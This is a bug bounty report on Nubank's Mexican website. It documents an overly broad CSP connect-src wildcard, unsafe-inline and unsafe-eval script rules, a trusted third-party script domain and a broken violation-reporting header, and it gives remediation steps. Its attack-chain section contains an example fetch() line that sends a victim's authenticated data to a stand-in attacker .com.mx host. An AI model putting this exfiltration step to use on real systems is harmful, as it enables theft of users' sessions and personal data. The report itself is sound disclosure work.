# Bugcrowd Finding #15 — nubank.com.mx CSP connect-src Wildcard `https://*.com.mx` Enables Exfiltration to Any .com.mx Domain

**Program:** Nubank Bug Bounty (Bugcrowd)
**Date:** 2026-09-01
**Severity (Standalone):** P3 Medium — Overly broad connect-src enables data exfiltration if XSS occurs
**Severity (Chained):** P1 Critical — Existing `unsafe-inline`+`unsafe-eval` in script-src + *.com.mx wildcard connect-src = XSS on nubank.com.mx allows exfiltrating victim session/API data to any attacker.com.mx
**VRT:** Server Security Misconfiguration > Content Security Policy
**Related:** Finding #8 (CORS mx/co), Finding #12 (staging CORS), Finding #4 (CSP addendum — unsafe-inline)

---

## Summary

The production `nubank.com.mx` website has two compounding CSP misconfigurations:

1. **`connect-src: https://*.com.mx`** — a wildcard that allows JavaScript on the page to make `fetch()` / XHR requests to **any `.com.mx` domain**, including attacker-controlled domains (e.g., `steal.attacker-mx.com.mx`)
2. **`script-src: 'unsafe-inline' 'unsafe-eval'`** — inline scripts and eval are permitted, meaning any XSS on `nubank.com.mx` executes arbitrary JavaScript with no CSP protection

Together, these create a direct exfiltration channel: any XSS on `nubank.com.mx` can send stolen data to an attacker-controlled `.com.mx` domain without violating the CSP.

---

## Technical Evidence

### CSP Header from nubank.com.mx

```bash
curl -sI "https://nubank.com.mx/" \
  -H "X-Correlation-Id: bc-handle" \
  -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
```

**Relevant CSP directives:**
```
content-security-policy:
  script-src 'self' 'unsafe-inline' 'unsafe-eval' https://*.google.com 
    https://*.gstatic.com https://*.figpii.com https://*.googletagmanager.com
    https://*.powerrobotflower.com https://*.amazon-adsystem.com 
    https://*.ads-twitter.com https://*.bing.com https://*.facebook.net 
    https://*.tiktok.com https://*.cloudflare.com https://*.clarity.ms 
    https://googleads.g.doubleclick.net;
  connect-src 'self' https://*.nu.com.mx https://nu.com.mx 
    https://*.nubank.com.mx https://nubank.com.mx 
    https://*.com.mx              <--- WILDCARD ALL .com.mx DOMAINS
    https://*.google.com.mx https://*.sentry.io ...
```

**Confirmed wildcard pattern:**
```
https://*.com.mx
```

This matches `https://steal.attacker.com.mx`, `https://exfil.evil.com.mx`, and any other `.com.mx` subdomain.

---

## Attack Chain — XSS on nubank.com.mx → Data Exfiltration to Attacker-Controlled .com.mx

```
[Prerequisite] XSS on nubank.com.mx
  ↓ script-src has 'unsafe-inline' → inline XSS payloads execute without CSP blocking
  ↓ No nonce or hash required

[Attack Step 1] Injected script runs on nubank.com.mx origin
  ↓ fetch('https://prod-global-auth.nu.com.mx/api/v1/user', {credentials:'include'})
  ↓ CSP connect-src allows *.nu.com.mx → request is permitted
  ↓ API returns authenticated user data (session active)

[Attack Step 2] Exfiltration via *.com.mx wildcard
  ↓ fetch('https://steal.attacker.com.mx/collect?d=' + btoa(JSON.stringify(userData)))
  ↓ CSP connect-src: https://*.com.mx → fetch to attacker.com.mx ALLOWED
  ↓ Data exfiltrated — attacker controls attacker.com.mx

[Impact] Victim's authenticated session data, PII, token info exfiltrated cross-origin
         without triggering CSP violations (both origin and destination are CSP-allowed)
```

---

## Additional Issues in nubank.com.mx CSP

### 1. CSP Report-Only Header Typo — Violation Reporting Broken
```
content-security-policy-report-only-x: ... eport-uri http://localhost:3000/csp-report;
```

The non-standard header name `content-security-policy-report-only-x` is ignored by all browsers. The `eport-uri` directive (missing leading 'r') inside it is also not valid. Result: **CSP violations are never reported** — attackers can exploit XSS without alerting security monitoring.

### 2. Third-Party Supply Chain — powerrobotflower.com in script-src
```
script-src: https://*.powerrobotflower.com
```

The `nubank.com.mx` production page allows scripts from `*.powerrobotflower.com`. This is a third-party marketing/analytics service. If this domain is compromised or misconfigured:
- Attacker can host malicious scripts on a *.powerrobotflower.com subdomain
- nubank.com.mx CSP allows these scripts to execute
- Combined with CORS trust (nubank.com.mx is trusted by all prod APIs with credentials — Finding #12), this is a P1 supply chain attack vector

### 3. connect-src Also Includes *.nubank.com.br (via nubank.com.br font-src)
```
font-src 'self' https://*.gstatic.com https://*.googleapis.com https://*.nubank.com.br
```
*(Note: Brazil domain in Mexican site CSP — cross-country resource loading)*

---

## Summary of nubank.com.mx CSP Issues

| Issue | Directive | Risk |
|-------|-----------|------|
| Inline XSS unrestricted | `script-src 'unsafe-inline' 'unsafe-eval'` | Any injected script runs |
| Wildcard connect-src | `connect-src https://*.com.mx` | Exfiltration to any .com.mx domain |
| Third-party script trust | `script-src *.powerrobotflower.com` | Supply chain attack vector |
| CSP violation reporting broken | `content-security-policy-report-only-x` (non-standard header) + `eport-uri` typo | No visibility into XSS exploitation |

---

## Comparison — Production CSP vs. Staging CSP

The staging site (`staging-www.nubank.com.mx`, Finding #12) has the **same CSP issues** as production, confirming this is not a staging-only misconfiguration but a systematic CSP policy issue.

---

## Remediation

| Issue | Fix |
|-------|-----|
| `connect-src https://*.com.mx` | Replace with explicit allowlist: `https://*.nu.com.mx https://nu.com.mx https://*.nubank.com.mx https://nubank.com.mx` — remove the wildcard *.com.mx |
| `'unsafe-inline'` in `script-src` | Implement nonce-based CSP: add a random nonce to each `<script>` tag and update script-src to use that nonce |
| `'unsafe-eval'` in `script-src` | Remove — refactor code to not use eval(); most frameworks have a no-eval mode |
| `powerrobotflower.com` | Audit third-party; replace wildcard `*.powerrobotflower.com` with specific URLs |
| CSP header name typo | Fix `content-security-policy-report-only-x` → `content-security-policy-report-only` and `eport-uri` → `report-uri` |

---

## Notes

- `nubank.com.mx` is the main Mexican consumer website — high traffic, many authenticated users
- All CSP analysis is via `curl -sI` header inspection — no script execution performed
- XSS on nubank.com.mx was not tested (passive observation only) — vulnerability is in the CSP that would fail to prevent/detect an XSS attack
- All requests used `X-Correlation-Id: bc-handle` as required
